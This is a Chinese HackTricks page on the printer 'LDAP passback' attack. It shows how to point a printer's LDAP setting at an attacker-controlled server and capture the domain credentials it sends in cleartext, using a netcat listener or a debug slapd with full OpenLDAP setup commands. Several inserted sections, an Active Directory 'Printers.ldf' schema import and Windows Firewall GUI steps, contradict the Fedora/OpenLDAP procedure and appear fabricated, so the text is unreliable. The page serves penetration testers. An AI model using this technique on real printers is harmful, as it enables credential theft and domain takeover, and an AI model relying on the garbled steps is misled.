<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks云 ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 推特 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

- 你在一家**网络安全公司**工作吗？你想在HackTricks中看到你的**公司广告**吗？或者你想获得**PEASS的最新版本或下载PDF格式的HackTricks**吗？请查看[**订阅计划**](https://github.com/sponsors/carlospolop)！

- 发现我们的独家[**NFTs**](https://opensea.io/collection/the-peass-family)收藏品- [**The PEASS Family**](https://opensea.io/collection/the-peass-family)

- 获取[**官方PEASS和HackTricks周边产品**](https://peass.creator-spring.com)

- **加入** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord群组**](https://discord.gg/hRep4RUj7f) 或 [**电报群组**](https://t.me/peass) 或 **关注**我在**Twitter**上的[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**

- **通过向[hacktricks repo](https://github.com/carlospolop/hacktricks)和[hacktricks-cloud repo](https://github.com/carlospolop/hacktricks-cloud)提交PR来分享你的黑客技巧**。

</details>


互联网上有几篇博客**强调了将打印机配置为具有默认/弱LDAP登录凭据的危险性**。这是因为攻击者可以**欺骗打印机对一个恶意的LDAP服务器进行身份验证**（通常只需要`nc -vv -l -p 444`），并以明文形式捕获打印机的**凭据**。

此外，一些打印机将包含**用户名的日志**，甚至可以从域控制器**下载所有用户名**。

所有这些**敏感信息**和常见的**安全缺失**使得打印机对攻击者非常有吸引力。

以下是一些关于此主题的博客：

- [https://www.ceos3c.com/hacking/obtaining-domain-credentials-printer-netcat/](https://www.ceos3c.com/hacking/obtaining-domain-credentials-printer-netcat/)
- [https://medium.com/@nickvangilder/exploiting-multifunction-printers-during-a-penetration-test-engagement-28d3840d8856](https://medium.com/@nickvangilder/exploiting-multifunction-printers-during-a-penetration-test-engagement-28d3840d8856)

**以下信息摘自** [**https://grimhacker.com/2018/03/09/just-a-printer/**](https://grimhacker.com/2018/03/09/just-a-printer/)

# LDAP设置

在Konica Minolta打印机上，可以配置要连接的LDAP服务器以及凭据。在这些设备的早期固件版本中，我听说可以通过读取页面的HTML源代码来恢复凭据。然而，现在凭据不会在界面中返回，所以我们需要更加努力。

LDAP服务器列表位于：网络 > LDAP设置 > 设置LDAP

界面允许修改LDAP服务器而无需重新输入将用于连接的凭据。我认为这是为了简化用户体验，但它为攻击者提供了从打印机的控制权升级到域的脚趾的机会。

我们可以将LDAP服务器地址设置重新配置为我们控制的机器，并使用有用的“测试连接”功能触发连接。

# 监听获取信息

## netcat

如果你比我运气好，你可能只需要一个简单的netcat监听器：
```
sudo nc -k -v -l -p 386
```
我得到了[@\_castleinthesky](https://twitter.com/\_castleinthesky)的保证，这种方法大多数时候都有效，但我还没有轻易放过。

## Slapd

我发现需要一个完整的LDAP服务器，因为打印机首先尝试进行空绑定，然后查询可用的信息，只有在这些操作成功后，它才会使用凭据进行绑定。

我搜索了一个满足要求的简单LDAP服务器，但似乎选择有限。最后，我选择设置一个开放的LDAP服务器，并使用slapd调试服务器服务来接受连接并打印出打印机的消息。（如果你知道更简单的替代方法，我会很乐意听到）

### 安装

（注意，本节是对这里的指南进行轻微调整的版本[https://www.server-world.info/en/note?os=Fedora\_26\&p=openldap](https://www.server-world.info/en/note?os=Fedora\_26\&p=openldap)）

从root终端开始：

**安装OpenLDAP**，
```
#> dnf install -y install openldap-servers openldap-clients

#> cp /usr/share/openldap-servers/DB_CONFIG.example /var/lib/ldap/DB_CONFIG

#> chown ldap. /var/lib/ldap/DB_CONFIG
```
**设置 OpenLDAP 管理员密码（您很快将再次需要它）**
```
#> slappasswd
New password:
Re-enter new password:
{SSHA}xxxxxxxxxxxxxxxxxxxxxxxx
```

```
#> vim chrootpw.ldif
# specify the password generated above for "olcRootPW" section
dn: olcDatabase={0}config,cn=config
changetype: modify
add: olcRootPW
olcRootPW: {SSHA}xxxxxxxxxxxxxxxxxxxxxxxx
```

```
#> ldapadd -Y EXTERNAL -H ldapi:/// -f chrootpw.ldif
SASL/EXTERNAL authentication started
SASL username: gidNumber=0+uidNumber=0,cn=peercred,cn=external,cn=auth
SASL SSF: 0
modifying entry "olcDatabase={0}config,cn=config"
```
**导入基本模式**

```plaintext
In order to gather information about Active Directory (AD) from printers, it is necessary to import basic schemas into the AD. These schemas define the attributes and classes that will be used to store the printer information.

To import the basic schemas, follow these steps:

1. Open a command prompt with administrative privileges.
2. Navigate to the folder where the basic schemas are located. The schemas can be found in the "Printers" folder of the "Windows Server Resource Kit Tools" installation directory.
3. Run the following command to import the schemas:
   ```
   ldifde -i -f Printers.ldf
   ```
   This command will import the schemas defined in the "Printers.ldf" file.
4. Verify that the schemas were imported successfully by checking the AD schema using the ADSI Edit tool or any other LDAP browser.

Once the basic schemas are imported, the AD will be able to store printer information using the defined attributes and classes. This will allow for easier retrieval and management of printer-related data within the AD environment.
```
```plaintext
为了从打印机中收集有关Active Directory（AD）的信息，需要将基本模式导入到AD中。这些模式定义了用于存储打印机信息的属性和类。

要导入基本模式，请按照以下步骤进行操作：

1. 以管理员权限打开命令提示符。
2. 导航到包含基本模式的文件夹。这些模式可以在“Windows Server Resource Kit Tools”安装目录的“Printers”文件夹中找到。
3. 运行以下命令以导入模式：
   ```
   ldifde -i -f Printers.ldf
   ```
   此命令将导入“Printers.ldf”文件中定义的模式。
4. 使用ADSI Edit工具或任何其他LDAP浏览器检查AD模式，以验证模式是否成功导入。

一旦导入了基本模式，AD将能够使用定义的属性和类存储打印机信息。这将使得在AD环境中更容易检索和管理与打印机相关的数据。
```
```
#> ldapadd -Y EXTERNAL -H ldapi:/// -f /etc/openldap/schema/cosine.ldif
SASL/EXTERNAL authentication started
SASL username: gidNumber=0+uidNumber=0,cn=peercred,cn=external,cn=auth
SASL SSF: 0
adding new entry "cn=cosine,cn=schema,cn=config"

#> ldapadd -Y EXTERNAL -H ldapi:/// -f /etc/openldap/schema/nis.ldif
SASL/EXTERNAL authentication started
SASL username: gidNumber=0+uidNumber=0,cn=peercred,cn=external,cn=auth
SASL SSF: 0
adding new entry "cn=nis,cn=schema,cn=config"

#> ldapadd -Y EXTERNAL -H ldapi:/// -f /etc/openldap/schema/inetorgperson.ldif
SASL/EXTERNAL authentication started
SASL username: gidNumber=0+uidNumber=0,cn=peercred,cn=external,cn=auth
SASL SSF: 0
adding new entry "cn=inetorgperson,cn=schema,cn=config"
```
**在LDAP数据库上设置您的域名。**
```
# generate directory manager's password
#> slappasswd
New password:
Re-enter new password:
{SSHA}xxxxxxxxxxxxxxxxxxxxxxxx

#> vim chdomain.ldif
# specify the password generated above for "olcRootPW" section
dn: olcDatabase={1}monitor,cn=config
changetype: modify
replace: olcAccess
olcAccess: {0}to * by dn.base="gidNumber=0+uidNumber=0,cn=peercred,cn=external,cn=auth"
read by dn.base="cn=Manager,dc=foo,dc=bar" read by * none

dn: olcDatabase={2}mdb,cn=config
changetype: modify
replace: olcSuffix
olcSuffix: dc=foo,dc=bar

dn: olcDatabase={2}mdb,cn=config
changetype: modify
replace: olcRootDN
olcRootDN: cn=Manager,dc=foo,dc=bar

dn: olcDatabase={2}mdb,cn=config
changetype: modify
add: olcRootPW
olcRootPW: {SSHA}xxxxxxxxxxxxxxxxxxxxxxxx

dn: olcDatabase={2}mdb,cn=config
changetype: modify
add: olcAccess
olcAccess: {0}to attrs=userPassword,shadowLastChange by
dn="cn=Manager,dc=foo,dc=bar" write by anonymous auth by self write by * none
olcAccess: {1}to dn.base="" by * read
olcAccess: {2}to * by dn="cn=Manager,dc=foo,dc=bar" write by * read

#> ldapmodify -Y EXTERNAL -H ldapi:/// -f chdomain.ldif
SASL/EXTERNAL authentication started
SASL username: gidNumber=0+uidNumber=0,cn=peercred,cn=external,cn=auth
SASL SSF: 0
modifying entry "olcDatabase={1}monitor,cn=config"

modifying entry "olcDatabase={2}mdb,cn=config"

modifying entry "olcDatabase={2}mdb,cn=config"

modifying entry "olcDatabase={2}mdb,cn=config"

modifying entry "olcDatabase={2}mdb,cn=config"

#> vim basedomain.ldif
dn: dc=foo,dc=bar
objectClass: top
objectClass: dcObject
objectclass: organization
o: Foo Bar
dc: DC1

dn: cn=Manager,dc=foo,dc=bar
objectClass: organizationalRole
cn: Manager
description: Directory Manager

dn: ou=People,dc=foo,dc=bar
objectClass: organizationalUnit
ou: People

dn: ou=Group,dc=foo,dc=bar
objectClass: organizationalUnit
ou: Group

#> ldapadd -x -D cn=Manager,dc=foo,dc=bar -W -f basedomain.ldif
Enter LDAP Password: # directory manager's password
adding new entry "dc=foo,dc=bar"

adding new entry "cn=Manager,dc=foo,dc=bar"

adding new entry "ou=People,dc=foo,dc=bar"

adding new entry "ou=Group,dc=foo,dc=bar"
```
**配置LDAP TLS**

**创建SSL证书**
```
#> cd /etc/pki/tls/certs
#> make server.key
umask 77 ; \
/usr/bin/openssl genrsa -aes128 2048 > server.key
Generating RSA private key, 2048 bit long modulus
...
...
e is 65537 (0x10001)
Enter pass phrase: # set passphrase
Verifying - Enter pass phrase: # confirm

# remove passphrase from private key
#> openssl rsa -in server.key -out server.key
Enter pass phrase for server.key: # input passphrase
writing RSA key

#> make server.csr
umask 77 ; \
/usr/bin/openssl req -utf8 -new -key server.key -out server.csr
You are about to be asked to enter information that will be incorporated
into your certificate request.
What you are about to enter is what is called a Distinguished Name or a DN.
There are quite a few fields but you can leave some blank
For some fields there will be a default value,
If you enter '.', the field will be left blank.
-----
Country Name (2 letter code) [XX]: # country
State or Province Name (full name) []: # state
Locality Name (eg, city) [Default City]: # city
Organization Name (eg, company) [Default Company Ltd]: # company
Organizational Unit Name (eg, section) []:Foo Bar # department
Common Name (eg, your name or your server's hostname) []:www.foo.bar # server's FQDN
Email Address []:xxx@foo.bar # admin email
Please enter the following 'extra' attributes
to be sent with your certificate request
A challenge password []: # Enter
An optional company name []: # Enter

#> openssl x509 -in server.csr -out server.crt -req -signkey server.key -days 3650
Signature ok
subject=/C=/ST=/L=/O=/OU=Foo Bar/CN=dlp.foo.bar/emailAddress=xxx@roo.bar
Getting Private key
```
**配置 Slapd 以使用 SSL/TLS**

To configure Slapd for SSL/TLS, follow these steps:

1. Generate a self-signed certificate or obtain a certificate from a trusted Certificate Authority (CA).

2. Copy the certificate and private key files to the appropriate directory on the server.

3. Update the Slapd configuration file (`slapd.conf` or `slapd.d/cn=config`) to enable SSL/TLS and specify the certificate and key file paths.

4. Set the appropriate permissions on the certificate and key files to ensure only the Slapd process can access them.

5. Restart the Slapd service to apply the changes.

Here is an example of how the configuration file should be updated:

```
TLSCertificateFile /path/to/certificate.crt
TLSCertificateKeyFile /path/to/privatekey.key
TLSCACertificateFile /path/to/ca.crt
TLSVerifyClient never
```

Make sure to replace `/path/to/` with the actual file paths.

After configuring Slapd for SSL/TLS, all communication between the LDAP client and server will be encrypted, providing an additional layer of security.
```
#> cp /etc/pki/tls/certs/server.key \
/etc/pki/tls/certs/server.crt \
/etc/pki/tls/certs/ca-bundle.crt \
/etc/openldap/certs/

#> chown ldap. /etc/openldap/certs/server.key \
/etc/openldap/certs/server.crt \
/etc/openldap/certs/ca-bundle.crt

#> vim mod_ssl.ldif
# create new
dn: cn=config
changetype: modify
add: olcTLSCACertificateFile
olcTLSCACertificateFile: /etc/openldap/certs/ca-bundle.crt
-
replace: olcTLSCertificateFile
olcTLSCertificateFile: /etc/openldap/certs/server.crt
-
replace: olcTLSCertificateKeyFile
olcTLSCertificateKeyFile: /etc/openldap/certs/server.key

#> ldapmodify -Y EXTERNAL -H ldapi:/// -f mod_ssl.ldif
SASL/EXTERNAL authentication started
SASL username: gidNumber=0+uidNumber=0,cn=peercred,cn=external,cn=auth
SASL SSF: 0
modifying entry "cn=config"
```
**允许本地防火墙通过LDAP**

To allow LDAP traffic through your local firewall, follow these steps:

1. Open the Windows Firewall with Advanced Security.
2. In the left pane, click on "Inbound Rules".
3. In the right pane, click on "New Rule".
4. Select "Port" and click "Next".
5. Choose "Specific local ports" and enter "389" (or the port number used for LDAP) in the textbox. Click "Next".
6. Select "Allow the connection" and click "Next".
7. Choose the network types for which this rule should apply. Click "Next".
8. Enter a name and description for the rule. Click "Finish".

**允许本地防火墙通过LDAP流量的步骤如下：**

1. 打开“高级安全性的Windows防火墙”。
2. 在左侧窗格中，点击“入站规则”。
3. 在右侧窗格中，点击“新建规则”。
4. 选择“端口”，然后点击“下一步”。
5. 选择“特定本地端口”，在文本框中输入“389”（或用于LDAP的端口号）。点击“下一步”。
6. 选择“允许连接”，然后点击“下一步”。
7. 选择适用于此规则的网络类型。点击“下一步”。
8. 为规则输入名称和描述。点击“完成”。
```
firewall-cmd --add-service={ldap,ldaps}
```
## 收益

安装和配置LDAP服务后，可以使用以下命令运行它：

> ```
> slapd -d 2
> ```

下面的屏幕截图显示了在打印机上运行连接测试时的输出示例。如您所见，用户名和密码从LDAP客户端传递到服务器。

![包含用户名"MyUser"和密码"MyPassword"的slapd终端输出](https://i1.wp.com/grimhacker.com/wp-content/uploads/2018/03/slapd\_output.png?resize=474%2C163\&ssl=1)

# 有多糟糕？

这在很大程度上取决于已配置的凭据。

如果遵循最小特权原则，则可能只能获得对Active Directory的某些元素的读取访问权限。尽管如此，这通常仍然很有价值，因为您可以使用这些信息来制定进一步更准确的攻击。

通常，您可能会获得域用户组中的一个帐户，该帐户可能会提供对敏感信息的访问权限，或者作为其他攻击的先决身份验证。

或者，就像我一样，您可能会因设置LDAP服务器而被授予一个域管理员帐户。

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

- 您在**网络安全公司**工作吗？您想在HackTricks中看到您的公司广告吗？或者您想获得PEASS的**最新版本或下载PDF格式的HackTricks**吗？请查看[**订阅计划**](https://github.com/sponsors/carlospolop)！

- 发现我们的独家[NFT](https://opensea.io/collection/the-peass-family)收藏品[**The PEASS Family**](https://opensea.io/collection/the-peass-family)

- 获得[**官方PEASS和HackTricks周边产品**](https://peass.creator-spring.com)

- **加入**[**💬**](https://emojipedia.org/speech-balloon/) [**Discord群组**](https://discord.gg/hRep4RUj7f)或[**电报群组**](https://t.me/peass)，或在**Twitter**上**关注**我[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**。**

- **通过向[hacktricks repo](https://github.com/carlospolop/hacktricks)和[hacktricks-cloud repo](https://github.com/carlospolop/hacktricks-cloud)提交PR来分享您的黑客技巧**。

</details>
